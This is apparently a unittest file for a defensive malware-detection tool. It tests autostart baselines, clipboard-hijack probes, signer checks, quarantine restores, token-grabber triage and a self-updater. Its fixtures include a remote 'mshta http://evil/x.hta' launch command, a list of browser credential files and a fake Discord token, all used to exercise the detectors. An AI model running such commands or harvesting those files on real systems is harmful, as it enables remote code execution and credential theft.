"""Tests for the autostart baseline, clipper detection, signer identity,
quarantine re-assessment, token-grabber triage, and the self-updater."""
from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from candy import selfupdate  # noqa: E402
from candy.baseline import BaselineStore, format_diff  # noqa: E402
from candy.clipboard import (ClipboardMonitor, PROBE_VALUES, assess_swap,  # noqa: E402
                             classify)
from candy.config import Config  # noqa: E402
from candy.detect import Analyzer  # noqa: E402
from candy.guard import DownloadGuard  # noqa: E402
from candy.persistence import PersistenceEntry  # noqa: E402
from candy.pesample import build_test_pe  # noqa: E402
from candy.responder import Responder  # noqa: E402
from candy.triage import triage  # noqa: E402
from candy.winapi import signer_changed  # noqa: E402
from test_core import make_db  # noqa: E402


def config_for(tmp: str) -> Config:
    root = Path(tmp)
    return Config({"paths": {"data": str(root / "d"), "logs": str(root / "l"),
                             "quarantine": str(root / "q")}}, root / "config.json")


def entry(source: str, name: str, command: str, location: str = "") -> PersistenceEntry:
    return PersistenceEntry(source=source, name=name, command=command, location=location)


class BaselineTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.config = config_for(self.tmp.name)
        self.store = BaselineStore(self.config)
        self.original = [entry("hkcu_run", "Steam", r"C:\Program Files\Steam\steam.exe"),
                         entry("service", "AudioSrv", r"C:\Windows\System32\audiosrv.dll")]

    def tearDown(self):
        self.tmp.cleanup()

    def test_no_baseline_says_so_rather_than_claiming_clean(self):
        report = self.store.diff(self.original)
        self.assertFalse(report.has_baseline)
        self.assertIn("No baseline", format_diff(report))

    def test_an_unchanged_machine_reports_nothing(self):
        self.store.save(self.store.capture(self.original))
        report = self.store.diff(self.original)
        self.assertEqual(report.changes, [])
        self.assertEqual(report.unchanged, 2)

    def test_a_new_autostart_entry_is_the_finding(self):
        self.store.save(self.store.capture(self.original))
        later = self.original + [
            entry("hkcu_run", "Updater", r"C:\Users\p\AppData\Local\Temp\svc.exe")]
        report = self.store.diff(later)
        self.assertEqual(len(report.added), 1)
        self.assertEqual(report.added[0].entry.name, "Updater")

    def test_running_from_temp_raises_the_severity(self):
        self.store.save(self.store.capture(self.original))
        quiet = self.store.diff(self.original + [
            entry("hkcu_run", "Thing", r"C:\Program Files\Thing\thing.exe")])
        loud = self.store.diff(self.original + [
            entry("hkcu_run", "Thing", r"C:\Users\p\AppData\Local\Temp\thing.exe")])
        self.assertGreater(loud.changes[0].score, quiet.changes[0].score)

    def test_replacing_the_target_of_an_existing_entry_reads_as_changed(self):
        """A hijack of something already trusted, not a new entry beside it."""
        self.store.save(self.store.capture(self.original))
        hijacked = [entry("hkcu_run", "Steam", r"C:\Users\p\AppData\Roaming\evil.exe"),
                    self.original[1]]
        report = self.store.diff(hijacked)
        self.assertEqual(len(report.changed), 1)
        self.assertEqual(len(report.added), 0)
        self.assertIn("steam.exe", report.changed[0].was.lower())

    def test_a_changed_entry_outranks_a_new_one(self):
        self.store.save(self.store.capture(self.original))
        report = self.store.diff([
            entry("hkcu_run", "Steam", r"C:\Program Files\Steam\other.exe"),
            self.original[1],
            entry("hkcu_run", "New", r"C:\Program Files\New\new.exe")])
        self.assertEqual(report.changes[0].kind, "changed")

    def test_a_removed_entry_is_reported_quietly(self):
        self.store.save(self.store.capture(self.original))
        report = self.store.diff(self.original[:1])
        self.assertEqual(len(report.removed), 1)
        self.assertEqual(report.removed[0].severity, "info")

    def test_a_known_threat_in_a_new_entry_escalates_it(self):
        self.store.save(self.store.capture(self.original))
        analyzer = Analyzer(self.config, make_db())
        report = self.store.diff(
            self.original + [entry("hkcu_run", "K", r"C:\Users\p\krnl.exe")],
            analyzer=analyzer)
        self.assertIn(report.changes[0].severity, ("high", "critical"))

    def test_powershell_and_mshta_are_weighed(self):
        self.store.save(self.store.capture(self.original))
        report = self.store.diff(self.original + [
            entry("hkcu_run", "X", r"mshta http://evil/x.hta")])
        self.assertTrue(any("mshta" in reason for reason in report.changes[0].reasons))

    def test_the_report_admits_what_a_baseline_cannot_prove(self):
        self.store.save(self.store.capture(self.original))
        text = format_diff(self.store.diff(self.original))
        self.assertIn("already compromised", text)

    def test_a_baseline_survives_a_reload(self):
        self.store.save(self.store.capture(self.original, note="after a clean install"))
        reloaded = BaselineStore(self.config).load()
        self.assertEqual(len(reloaded.entries), 2)
        self.assertIn("clean install", reloaded.note)


class ClipboardTests(unittest.TestCase):
    def test_addresses_are_classified_by_shape(self):
        self.assertEqual(classify("0x" + "a" * 40), "ethereum")
        self.assertEqual(classify("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"), "bitcoin")
        self.assertIsNone(classify("hello there"))
        self.assertIsNone(classify(""))

    def test_a_same_type_substitution_is_a_finding(self):
        finding = assess_swap("0x" + "a" * 40, "0x" + "b" * 40)
        self.assertIsNotNone(finding)
        self.assertEqual(finding.kind, "ethereum")

    def test_copying_ordinary_text_afterwards_is_not(self):
        self.assertIsNone(assess_swap("0x" + "a" * 40, "my homework notes"))

    def test_copying_text_then_an_address_is_not(self):
        self.assertIsNone(assess_swap("some notes", "0x" + "b" * 40))

    def test_an_identical_value_is_not_a_swap(self):
        self.assertIsNone(assess_swap("0x" + "a" * 40, "0x" + "a" * 40))

    def test_a_fast_substitution_scores_higher(self):
        slow = assess_swap("0x" + "a" * 40, "0x" + "b" * 40, seconds_apart=30)
        fast = assess_swap("0x" + "a" * 40, "0x" + "b" * 40, seconds_apart=0.3)
        self.assertGreater(fast.score, slow.score)
        self.assertEqual(fast.severity, "critical")

    def test_the_finding_tells_the_user_what_to_do(self):
        finding = assess_swap("0x" + "a" * 40, "0x" + "b" * 40)
        self.assertIn("before you send", " ".join(finding.reasons))

    def test_every_probe_value_satisfies_its_own_pattern(self):
        """A decoy the classifier rejects makes the active probe silently
        inert — it writes bait, reads the swap back, and discards it."""
        for kind, value in PROBE_VALUES.items():
            with self.subTest(kind=kind):
                self.assertEqual(classify(value), kind)

    def test_a_rewritten_probe_is_not_treated_as_a_coincidence(self):
        finding = assess_swap(PROBE_VALUES["ethereum"], "0x" + "b" * 40, probe=True)
        self.assertTrue(finding.probe)
        self.assertEqual(finding.severity, "critical")
        self.assertIn("hijacker", " ".join(finding.reasons))

    def test_the_monitor_reports_a_swap_through_the_sink(self):
        with tempfile.TemporaryDirectory() as tmp:
            seen = []
            values = iter(["0x" + "a" * 40, "0x" + "b" * 40])
            monitor = ClipboardMonitor(config_for(tmp), seen.append,
                                       reader=lambda: next(values, None))
            self.assertIsNone(monitor.poll_once())
            self.assertIsNotNone(monitor.poll_once())
            self.assertEqual(len(seen), 1)
            self.assertEqual(seen[0].source, "clipboard")

    def test_the_probe_restores_what_was_on_the_clipboard(self):
        """Eating someone's clipboard is not an acceptable cost of a check."""
        with tempfile.TemporaryDirectory() as tmp:
            written: list[str] = []
            state = {"value": "something the user copied"}

            def reader():
                return state["value"]

            def writer(text):
                state["value"] = text
                written.append(text)
                return True

            monitor = ClipboardMonitor(config_for(tmp), reader=reader, writer=writer)
            monitor.probe(settle=0.2)
            self.assertEqual(state["value"], "something the user copied")
            self.assertIn(PROBE_VALUES["bitcoin"], written)

    def test_a_clipper_that_rewrites_the_probe_is_caught(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = {"value": "", "swapped": False}

            def reader():
                if state["value"] == PROBE_VALUES["bitcoin"] and not state["swapped"]:
                    state["swapped"] = True
                    state["value"] = "1AttackerAddressGoesRightHere12345"
                return state["value"]

            def writer(text):
                state["value"] = text
                return True

            monitor = ClipboardMonitor(config_for(tmp), reader=reader, writer=writer)
            finding = monitor.probe(settle=0.2)
            self.assertIsNotNone(finding)
            self.assertTrue(finding.probe)

    def test_the_monitor_is_off_by_default(self):
        with tempfile.TemporaryDirectory() as tmp:
            monitor = ClipboardMonitor(config_for(tmp))
            monitor.start()
            self.assertEqual(monitor.mode, "disabled")


class SignerTests(unittest.TestCase):
    def test_an_unknown_signer_is_never_a_change(self):
        """A tool that shouts 'different publisher!' because it could not read
        one of them is a tool that gets ignored."""
        self.assertFalse(signer_changed(None, "Evil Ltd"))
        self.assertFalse(signer_changed("Acme Ltd", None))
        self.assertFalse(signer_changed(None, None))
        self.assertFalse(signer_changed("", "Evil Ltd"))

    def test_the_same_publisher_is_not_a_change(self):
        self.assertFalse(signer_changed("Acme Ltd", "acme ltd"))
        self.assertFalse(signer_changed("Acme Ltd", " Acme Ltd "))

    def test_a_different_publisher_is(self):
        self.assertTrue(signer_changed("Acme Ltd", "Totally Legit LLC"))

    def test_signer_name_is_none_off_windows(self):
        from candy.winapi import signer_name

        self.assertIsNone(signer_name(__file__))


class QuarantineRestoreTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.config = config_for(self.tmp.name)
        self.responder = Responder(self.config)
        self.analyzer = Analyzer(self.config, make_db(), signature_checker=lambda _p: False)
        self.guard = DownloadGuard(self.config, self.analyzer, self.responder,
                                   signature_checker=lambda _p: False)

    def tearDown(self):
        self.tmp.cleanup()

    def _quarantine(self, name: str) -> str:
        path = Path(self.tmp.name) / name
        path.write_bytes(build_test_pe())
        self.responder.quarantine(path, forced=True)
        return self.responder.list_quarantine()[0]["quarantine_file"]

    def test_a_still_dangerous_file_is_re_quarantined_on_restore(self):
        target = self._quarantine("krnl.exe")
        result = self.responder.restore(target, guard=self.guard)
        self.assertFalse(result.ok)
        self.assertIn("re-quarantined", result.detail)

    def test_force_restores_it_anyway(self):
        target = self._quarantine("krnl.exe")
        result = self.responder.restore(target, guard=self.guard, force=True)
        self.assertTrue(result.ok)

    def test_restoring_without_a_guard_still_works(self):
        target = self._quarantine("krnl.exe")
        self.assertTrue(self.responder.restore(target).ok)

    def test_a_harmless_file_restores_cleanly(self):
        target = self._quarantine("notes.exe")
        result = self.responder.restore(target, guard=self.guard)
        self.assertTrue(result.ok)


class TokenGrabberTests(unittest.TestCase):
    def _triage(self, extra: bytes):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sample.exe"
            path.write_bytes(build_test_pe() + extra)
            return triage(path)

    def test_a_credential_path_list_is_a_shopping_list(self):
        report = self._triage(b"\x00Local State\x00Login Data\x00cookies.sqlite\x00"
                              b"key4.db\x00ROBLOSECURITY")
        self.assertIn("credentials", report.capabilities)
        self.assertGreaterEqual(report.score, 60)

    def test_one_path_is_not_a_shopping_list(self):
        """Plenty of honest software mentions 'Local State'. The API-group rule
        may still flag it; the shopping-list note must not."""
        report = self._triage(b"\x00Local State\x00")
        self.assertFalse(any("shopping list" in note for note in report.notes))

    def test_a_discord_token_shape_is_flagged(self):
        report = self._triage(b"\x00MTAxNzc3MDAwMDAwMDAwMDAw.GxYzAb."
                              b"abcdefghijklmnopqrstuvwxyz123\x00")
        self.assertIn("tokens", report.exfil)

    def test_a_clean_binary_stays_clean(self):
        self.assertEqual(self._triage(b"").verdict, "clean")


class SelfUpdateTests(unittest.TestCase):
    def test_versions_compare_numerically(self):
        self.assertTrue(selfupdate.is_newer("1.10.0", "1.9.9"))
        self.assertFalse(selfupdate.is_newer("1.9.9", "1.10.0"))
        self.assertTrue(selfupdate.is_newer("v2.0", "1.99.99"))
        self.assertFalse(selfupdate.is_newer("1.0.0", "1.0.0"))

    def test_an_unparseable_version_does_not_raise(self):
        self.assertEqual(selfupdate.parse_version("weird"), (0,))
        self.assertEqual(selfupdate.parse_version(""), (0,))

    def test_a_manifest_needs_a_version_and_a_url(self):
        self.assertIsNone(selfupdate.parse_manifest('{"version": "2.0"}'))
        self.assertIsNone(selfupdate.parse_manifest("not json"))
        self.assertIsNotNone(selfupdate.parse_manifest(
            json.dumps({"version": "2.0", "url": "https://x/y"})))

    def test_an_unconfigured_updater_says_why_rather_than_guessing(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = selfupdate.Updater(config_for(tmp), "1.0.0").check()
            self.assertFalse(result.ok)
            self.assertIn("self_update_url", result.detail)

    def test_a_plain_http_feed_is_refused(self):
        with tempfile.TemporaryDirectory() as tmp:
            config = config_for(tmp)
            config.set("updates.self_update_url", "http://example.com/candy.json")
            result = selfupdate.Updater(config, "1.0.0").check()
            self.assertEqual(result.status, "refused")
            self.assertIn("HTTPS", result.detail)

    def test_status_reports_the_configuration_honestly(self):
        with tempfile.TemporaryDirectory() as tmp:
            status = selfupdate.Updater(config_for(tmp), "1.0.0").status()
            self.assertFalse(status["configured"])
            self.assertEqual(status["feed_url"], "(not configured)")

    def test_signature_verification_is_required_by_default(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertTrue(
                selfupdate.Updater(config_for(tmp), "1.0.0").status()["require_signature"])


if __name__ == "__main__":
    unittest.main()
